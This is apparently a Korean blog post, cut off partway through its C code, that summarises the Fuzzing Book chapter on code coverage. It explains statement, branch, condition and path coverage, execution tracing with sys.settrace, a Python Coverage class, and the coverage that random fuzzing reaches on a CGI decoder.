&lt;li&gt;단점 : 특정 조건분기문에서 에러를 찾아내지 못할 가능성이 있다.&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; *p = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(condition)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   p = &amp;amp;a;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*p = &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;condition이 false라면 null pointer error가 발생한다. 이때 coverage가 달성되었다고 하겠지만, 모든 경우를 test했다고 보장 할 수 없다.&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><a href="https://www.fuzzingbook.org/html/Coverage.html">https://www.fuzzingbook.org/html/Coverage.html</a></p><ul><li>Coverage란, 소프트웨어 테스팅을 하는데 사용되는 지표 중 하나로, Code가 얼마나 실행되었느냐를 측정한다.</li><li>Coverage를 측정하기 위해 instrumentation을 한다.</li><li>instrumentation은 작성된 코드가 실행되는 지를 확인하는 코드를 작성된 코드 사이사이에 삽입하는 것을 뜻한다.</li></ul><ol><li>Function coverage : 함수가 최소한 한 번 실행되었는 가를 측정한다. function call을 했는지만을 확인하기 때문에 해당 function안의 모든 코드가 실행되었는 지는 확인할 수 없다.</li></ol><ol start="2"><li>Statement coverage : 각 statement가 실행 되었는지를 측정한다. <ul><li>장점 : object code에 바로 적용 될 수 있다.</li><li>단점 : 특정 조건분기문에서 에러를 찾아내지 못할 가능성이 있다.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(condition)</span><br><span class="line">   p = &amp;a;</span><br><span class="line">*p = <span class="number">123</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ol><ul><li>condition이 false라면 null pointer error가 발생한다. 이때 coverage가 달성되었다고 하겠지만, 모든 경우를 test했다고 보장 할 수 없다.</li></ul><span id="more"></span> <ol start="3"><li>Brach coverage : 각 조건 분기문이 참/거짓으로 모두 실행되었는 지를 측정한다. <ul><li>장점 : Statement coverage가 가지고 있는 단점을 보완한다.</li><li>단점 : 조건문 전체를 확인해보지 않기 때문에 에러를 찾아내지 못할 가능성이 있다.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition1 &amp;&amp; (condition2 || function()))</span><br></pre></td></tr></table></figure></li></ul></li></ol><ul><li>condition2가 참이되는 순간 function()을 실행하지 않기 때문에 function()함수가 test되지 않는 경우가 발생한다.</li></ul><ol start="4"><li>Condition coverage : 조건 분기문에 있는 모든 expression들의 참/거짓을 측정한다.<ul><li>장점 : Branch coverage의 단점을 보완한다.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition1 || condition2 &amp;&amp; condition3) </span><br></pre></td></tr></table></figure></li></ul></li></ol><ul><li>condition1, condition2, condition3가 각각 모두 참/거짓인 경우를 확인한다.</li></ul><ol start="5"><li>Path coverage : 각 function에서 가능한 모든 Path를 실행해봤는지를 확인한다.</li></ol><ul><li>path란 함수의 시작부터 끝까지 존재하는 연속된 branch들을 뜻한다.</li><li>각 path는 unique하다.<ul><li>장점 : 엄밀한 테스팅이 가능하다.</li><li>단점 : Path의 수가 매우 많다.</li></ul></li></ul><hr><h1 id="Synopsis"><a href="#Synopsis" class="headerlink" title="Synopsis"></a>Synopsis</h1><ul><li>coverage 정보를 uncoverd locations로 fuzzing을 유도할 수 있다. (guided fuzzing)</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/155260541-41185ffc-7dd4-42c7-b9db-a71280d14946.png" alt="image"></p><hr><h1 id="A-CGI-Decoder"><a href="#A-CGI-Decoder" class="headerlink" title="A CGI Decoder"></a>A CGI Decoder</h1><ul><li>CGI encoding은 URL에서 사용된다.</li><li>공백은 ‘+’로, invaild한 문자는  ‘%xx’ 로 바뀐다. (xx는 두자리 hex)</li><li> “Hello, world!”  -&gt;  “Hello%2c+world%21”</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cgi_decode</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Decode the CGI-encoded string `s`:</span></span><br><span class="line"><span class="string">       * replace &#x27;+&#x27; by &#x27; &#x27;</span></span><br><span class="line"><span class="string">       * replace &quot;%xx&quot; by the character with hex number xx.</span></span><br><span class="line"><span class="string">       Return the decoded string.  Raise `ValueError` for invalid inputs.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Mapping of hex digits to their integer values</span></span><br><span class="line">    hex_values = &#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;7&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;8&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;9&#x27;</span>: <span class="number">9</span>,</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;f&#x27;</span>: <span class="number">15</span>,</span><br><span class="line">        <span class="string">&#x27;A&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;E&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;F&#x27;</span>: <span class="number">15</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(s):</span><br><span class="line">        c = s[i]</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            t += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">            digit_high, digit_low = s[i + <span class="number">1</span>], s[i + <span class="number">2</span>]</span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> digit_high <span class="keyword">in</span> hex_values <span class="keyword">and</span> digit_low <span class="keyword">in</span> hex_values:</span><br><span class="line">                v = hex_values[digit_high] * <span class="number">16</span> + hex_values[digit_low]</span><br><span class="line">                t += <span class="built_in">chr</span>(v)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid encoding&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t += c</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br></pre></td></tr></table></figure><ul><li>cgi_decode함수를 체계적으로 테스트 하고싶다면 두 가지 방법이 있다.</li><li>BlackBox testing과 WhiteBox testing</li></ul><h1 id="Black-Box-Testing"><a href="#Black-Box-Testing" class="headerlink" title="Black-Box Testing"></a>Black-Box Testing</h1><ul><li>블랙박스 테스트는 specification으로부터 테스트를 도출하는 것이다.</li><li>내부 구조나 동작 원리를 모르는 상태에서 소프트웨어의 동작을 검사하는 것.<ul><li>testing for correct replacement of ‘+’;</li><li>testing for correct replacement of “%xx”;</li><li>testing for non-replacement of other characters; and</li><li>testing for recognition of illegal inputs.</li></ul></li></ul><h1 id="White-Box-Testing"><a href="#White-Box-Testing" class="headerlink" title="White-Box Testing"></a>White-Box Testing</h1><ul><li>화이트박스 테스트는 내부 구조를 가지고 테스트를 도출하는 것이다.</li><li>코드의 구조적 특징을 다루는 개념과 밀접한 관련이 있다.<ul><li>The block following if c == ‘+’</li><li>The two blocks following if c == ‘%’ (one for valid input, one for invalid)</li><li>The final else case for all other characters.</li></ul></li></ul><h1 id="Tracing-Executions"><a href="#Tracing-Executions" class="headerlink" title="Tracing Executions"></a>Tracing Executions</h1><ul><li>파이썬에서는 함수 sys.settrace()를 사용하면 추적이 가능하다.</li><li>모든 라인에 대해 호출되는 추적함수 f를 정의하고 sys.settrace(f)를 호출하면 된다.</li><li>추적함수에는 3가지 매개변수가 있다. (frame, event, arg)<ul><li>frame 매개변수는 현재 frame을 가져와 현재 위치와 변수에 접근할 수 있다.<ul><li>frame.f_code는 현재 프레임과 함께 생성되는 코드이다.</li><li>frame.f_code.co_name은 함수 이름이다.</li><li>frame.f_lineno는 현재 라인 번호이다.</li><li>frame.f_locals는 지역 변수와 인자값 이다.</li></ul></li><li>event 매개변수는 문자열이 들어간다.<ul><li>“line”이면, 호출된 새로운 line,</li><li>“call”이면, 호출된 함수</li></ul></li><li>agr 매개변수는 어떠한 event에 대한 추가적인 인자이다.<ul><li>“return”이벤트일대 arg는 리턴 값을 포함한다.</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">traceit</span>(<span class="params">frame: FrameType, event: <span class="built_in">str</span>, arg: <span class="type">Any</span></span>) -&gt; <span class="type">Optional</span>[<span class="type">Callable</span>]:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Trace program execution. To be passed to sys.settrace().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;line&#x27;</span>:</span><br><span class="line">        <span class="keyword">global</span> coverage</span><br><span class="line">        function_name = frame.f_code.co_name</span><br><span class="line">        lineno = frame.f_lineno</span><br><span class="line">        coverage.append(lineno)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> traceit</span><br></pre></td></tr></table></figure><ul><li>추적함수 traceit을 선언해준다. 새로운 line이 호출되면, 호출된 lineno을 coverage 전역변수에 추가해주는 함수이다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cgi_decode_traced</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">    <span class="keyword">global</span> coverage</span><br><span class="line">    coverage = []</span><br><span class="line">    sys.settrace(traceit)  <span class="comment"># Turn on</span></span><br><span class="line">    cgi_decode(s)</span><br><span class="line">    sys.settrace(<span class="literal">None</span>)    <span class="comment"># Turn off</span></span><br></pre></td></tr></table></figure><ul><li>sys.settrace()함수로 추적함수를 실행 시킨 후, 추적할 함수 cgi_decode()를 호출한다.</li><li>그 후 sys.settrace(none)함수로 추적을 종료한다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> lineno <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cgi_decode_lines)):</span><br><span class="line">    <span class="keyword">if</span> (function_name, lineno) <span class="keyword">in</span> self.trace():</span><br><span class="line">    t += <span class="string">&quot;# &quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    t += <span class="string">&quot;  &quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%2d  &quot;</span> % lineno, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print_content(cgi_decode_lines[lineno], <span class="string">&#x27;.py&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><ul><li>추가적으로 위의 코드를 실행시키면,  커버되지 않은 line과 커버된 line에 표시를 할 수 있다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> Coverage() <span class="keyword">as</span> cov:</span><br><span class="line">    cgi_decode(<span class="string">&quot;a+b&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cov)</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/155457176-7759f4a3-c654-4d94-9f7d-892c89e433d7.png" alt="image"></p><ul><li>“a+b”를 주었을 때 if c==”+” block을 커버하고, elif문을 커버하지 않는 것을 확인할 수 있다.</li></ul><h1 id="A-Coverage-Class"><a href="#A-Coverage-Class" class="headerlink" title="A Coverage Class"></a>A Coverage Class</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> OBJECT [<span class="keyword">as</span> VARIABLE]:</span><br><span class="line">    BODY</span><br></pre></td></tr></table></figure><ul><li>파이썬으로 커버리지를 측정할때 일반적인 형식은  OBJECT가 정의되고 BODY가 실행되는데, </li><li>이때 OBJECT.<strong>enter</strong>()과, OBJECT.<strong>exit</strong>()가 자동으로 호출된다.</li><li>Coverage.<strong>enter</strong>()은 자동으로 추적을 시작하고.</li><li>Coverage.<strong>exit</strong>()은 추적을 종료한다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> Coverage() <span class="keyword">as</span> cov:</span><br><span class="line">    function_to_be_traced()</span><br><span class="line">c = cov.coverage()</span><br></pre></td></tr></table></figure><ul><li>function_to_be_traced()가 진행될 동안 추적을 시작하고, with block 다음에 다시 꺼진다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">Location = <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Coverage</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Constructor&quot;&quot;&quot;</span></span><br><span class="line">        self._trace: <span class="type">List</span>[Location] = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Trace function</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">traceit</span>(<span class="params">self, frame: FrameType, event: <span class="built_in">str</span>, arg: <span class="type">Any</span></span>) -&gt; <span class="type">Optional</span>[<span class="type">Callable</span>]:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Tracing function. To be overloaded in subclasses.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.original_trace_function <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.original_trace_function(frame, event, arg)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> event == <span class="string">&quot;line&quot;</span>:</span><br><span class="line">            function_name = frame.f_code.co_name</span><br><span class="line">            lineno = frame.f_lineno</span><br><span class="line">            <span class="keyword">if</span> function_name != <span class="string">&#x27;__exit__&#x27;</span>:  <span class="comment"># avoid tracing ourselves:</span></span><br><span class="line">                self._trace.append((function_name, lineno))</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> self.traceit</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span>(<span class="params">self</span>) -&gt; <span class="type">Any</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Start of `with` block. Turn on tracing.&quot;&quot;&quot;</span></span><br><span class="line">        self.original_trace_function = sys.gettrace()</span><br><span class="line">        sys.settrace(self.traceit)</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span>(<span class="params">self, exc_type: <span class="type">Type</span>, exc_value: BaseException, </span></span></span><br><span class="line"><span class="params"><span class="function">                 tb: TracebackType</span>) -&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;End of `with` block. Turn off tracing.&quot;&quot;&quot;</span></span><br><span class="line">        sys.settrace(self.original_trace_function)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># default: pass all exceptions</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">trace</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[Location]:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;The list of executed lines, as (function_name, line_number) pairs&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self._trace</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">coverage</span>(<span class="params">self</span>) -&gt; <span class="type">Set</span>[Location]:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;The set of executed lines, as (function_name, line_number) pairs&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set</span>(self.trace())</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function_names</span>(<span class="params">self</span>) -&gt; <span class="type">Set</span>[<span class="built_in">str</span>]:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;The set of function names seen&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set</span>(function_name <span class="keyword">for</span> (function_name, line_number) <span class="keyword">in</span> self.coverage())</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Return a string representation of this object.</span></span><br><span class="line"><span class="string">           Show covered (and uncovered) program code&quot;&quot;&quot;</span></span><br><span class="line">        t = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> function_name <span class="keyword">in</span> self.function_names():</span><br><span class="line">            <span class="comment"># Similar code as in the example above</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                fun = <span class="built_in">eval</span>(function_name)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">                t += <span class="string">f&quot;Skipping <span class="subst">&#123;function_name&#125;</span>: <span class="subst">&#123;exc&#125;</span>&quot;</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">            source_lines, start_line_number = inspect.getsourcelines(fun)</span><br><span class="line">            <span class="keyword">for</span> lineno <span class="keyword">in</span> <span class="built_in">range</span>(start_line_number, start_line_number + <span class="built_in">len</span>(source_lines)):</span><br><span class="line">                <span class="keyword">if</span> (function_name, lineno) <span class="keyword">in</span> self.trace():</span><br><span class="line">                    t += <span class="string">&quot;# &quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    t += <span class="string">&quot;  &quot;</span></span><br><span class="line">                t += <span class="string">&quot;%2d  &quot;</span> % lineno</span><br><span class="line">                t += source_lines[lineno - start_line_number]</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> t</span><br></pre></td></tr></table></figure><h1 id="Coverage-of-Basic-Fuzzing"><a href="#Coverage-of-Basic-Fuzzing" class="headerlink" title="Coverage of Basic Fuzzing"></a>Coverage of Basic Fuzzing</h1><ul><li>cgi_decode() 함수를 랜덤 퍼징으로 최고의 커버리지에 도달하는 것을 목표로 한다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> Coverage() <span class="keyword">as</span> cov_fuzz:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cgi_decode(sample)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">cov_fuzz.coverage()</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/155460763-8e12757e-25a1-48a6-acfa-88352f0f7c17.png" alt="image"></p><ul><li>maximum 커버리지라고 생각 될 수있지만, max 커버리지와 비교했을 때 여전히 몇 개의 라인을 놓친것을 확인 할 수 있다.</li></ul><h1 id="Getting-Coverage-from-External-Programs"><a href="#Getting-Coverage-from-External-Programs" class="headerlink" title="Getting Coverage from External Programs"></a>Getting Coverage from External Programs</h1><ul><li>거의 모든 프로그래밍 언어는 커버리지를 측정할 수 있는 기능이 있다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hex_values[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_hex_values</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(hex_values) / <span class="keyword">sizeof</span>(<span class="keyword">int</span>); i++) &#123;</span><br><span class="line">        hex_values[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hex_values[<span class="string">&#x27;0&#x27;</span>] = <span class="number">0</span>; hex_values[<span class="string">&#x27;1&#x27;</span>] = <span class="number">1</span>; hex_values[<span class="string">&#x27;2&#x27;</span>] = <span class="number">2</span>; hex_values[<span class="string">&#x27;3&#x27;</span>] = <span class="number">3</span>;</span><br><span class="line">    hex_values[<span class="string">&#x27;4&#x27;</span>] = <span class="number">4</span>; hex_values[<span class="string">&#x27;5&#x27;</span>] = <span class="number">5</span>; hex_values[<span class="string">&#x27;6&#x27;</span>] = <span class="number">6</span>; hex_values[<span class="string">&#x27;7&#x27;</span>] = <span class="number">7</span>;</span><br><span class="line">    hex_values[<span class="string">&#x27;8&#x27;</span>] = <span class="number">8</span>; hex_values[<span class="string">&#x27;9&#x27;</span>] = <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    hex_values[<span class="string">&#x27;a&#x27;</span>] = <span class="number">10</span>; hex_values[<span class="string">&#x27;b&#x27;</span>] = <span class="number">11</span>; hex_values[<span class="string">&#x27;c&#x27;</span>] = <span class="number">12</span>; hex_values[<span class="string">&#x27;d&#x27;</span>] = <span class="number">13</span>;</span><br><span class="line">    hex_values[<span class="string">&#x27;e&#x27;</span>] = <span class="number">14</span>; hex_values[<span class="string">&#x27;f&#x27;</span>] = <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line">    hex_values[<span class="string">&#x27;A&#x27;</span>] = <span class="number">10</span>; hex_values[<span class="string">&#x27;B&#x27;</span>] = <span class="number">11</span>; hex_values[<span class="string">&#x27;C&#x27;</span>] = <span class="number">12</span>; hex_values[<span class="string">&#x27;D&#x27;</span>] = <span class="number">13</span>;</span><br><span class="line">    hex_values[<span class="string">&#x27;E&#x27;</span>] = <span class="number">14</span>; hex_values[<span class="string">&#x27;F&#x27;</span>] = <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cgi_decode</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">char</span> *t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (*s != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*s == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            *t++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span 